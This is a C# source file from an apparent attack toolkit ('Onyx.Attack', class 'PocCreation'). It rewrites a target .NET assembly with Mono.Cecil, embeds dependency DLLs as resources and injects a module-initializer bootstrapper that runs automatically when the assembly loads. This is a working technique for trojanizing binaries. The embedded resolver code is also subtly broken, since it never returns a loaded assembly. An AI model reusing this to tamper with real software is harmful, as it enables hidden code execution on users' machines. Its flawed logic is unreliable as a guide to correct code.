using System.Reflection;
using HarmonyLib.Tools;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using Mono.Cecil;
using Onyx.Shared;
using ManifestResourceAttributes = Mono.Cecil.ManifestResourceAttributes;

namespace Onyx.Attack;

public static class PocCreation
{
    public static void Create(string udcTargetPath, string dependenciesDirectory, string outputPath)
    {
        var asmDef = AssemblyDefinition.ReadAssembly(udcTargetPath);
        List<string> dependencies = Directory.GetFiles(dependenciesDirectory)
            .Where(x => x.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
            .ToList();

        foreach (var dependency in dependencies)
        {
            byte[] dependencyBytes = File.ReadAllBytes(dependency);
            asmDef.MainModule.Resources.Add(
                new EmbeddedResource(Path.GetFileName(dependency), ManifestResourceAttributes.Public, dependencyBytes));
        }
        
        asmDef.MainModule.AssemblyReferences.Clear();

        string bootstrapper = @"
        using System;
        using System.Reflection;
        using System.Runtime.CompilerServices;
        using System.Linq;

        public static class Bootstrapper
        {
            [ModuleInitializer]
            public static void Init()
            {
                AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
                {
                    foreach (var resName in Assembly.GetExecutingAssembly().GetManifestResourceNames().Where(n => n.EndsWith("".dll"", StringComparison.OrdinalIgnoreCase)))
                    {
                        using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resName))
                        {
                            if (stream == null) return null;
                            byte[] assemblyData = new byte[stream.Length];
                            stream.Read(assemblyData, 0, assemblyData.Length);
                            var assembly = Assembly.Load(assemblyData);
                        }
                    }
                };
            }
        }";
        Compilation.CompileAndUse(bootstrapper, a =>
        {
            var bootstrapAsmDef = AssemblyDefinition.ReadAssembly(a.Location);
            var bootstrapTypeDef = bootstrapAsmDef.MainModule.GetType("Bootstrapper");
            PostCompilation.ImportType(bootstrapTypeDef, asmDef.MainModule);
            asmDef.Write(outputPath);
            asmDef = null!;
            
            return null;
        });
    }
}